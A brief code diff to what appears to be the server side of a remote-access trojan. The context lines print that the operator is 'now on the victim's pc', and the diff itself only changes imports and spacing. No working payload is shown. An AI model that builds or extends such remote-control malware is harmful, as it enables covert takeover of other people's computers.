@@ -1,8 +1,7 @@
 import signal
 import sys
-import traceback
-
 from remoteCommandsServer import *
+import wavio as wv
 
 def main(fileLog):
     try:
@@ -49,6 +48,7 @@ def main(fileLog):
                         print(f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n")
                         fileLog=fileLog+"\n"+ f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n"
                         typeExit, fileLog=remoteControl(clientConnection,buff,fileLog)
+
                         attivo = 0
                         if typeExit=="[ERROR]":
                             raise Exception
